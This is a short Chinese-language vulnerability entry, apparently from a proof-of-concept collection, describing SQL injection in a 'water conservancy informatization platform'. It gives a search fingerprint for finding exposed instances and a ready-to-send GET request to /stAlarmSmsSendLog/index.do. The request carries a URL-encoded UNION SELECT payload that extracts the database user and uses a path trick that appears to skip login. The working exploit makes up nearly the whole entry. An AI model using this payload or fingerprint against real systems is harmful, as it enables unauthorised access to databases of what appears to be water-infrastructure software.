# 水利信息化平台index.do存在SQL注入漏洞

水利信息化平台 ｜ SQL注入 ｜ —
- **指纹**：`title="水利信息化平台"`
- **请求**：`GET /stAlarmSmsSendLog/index.do;userLogin.do;?phone_query=%27%2BUNION%2BALL%2BSELECT%2BCONCAT%280x7e%2Cuser%28%29%2C0x7e%29%23 HTTP/1.1`
- **响应特征**：200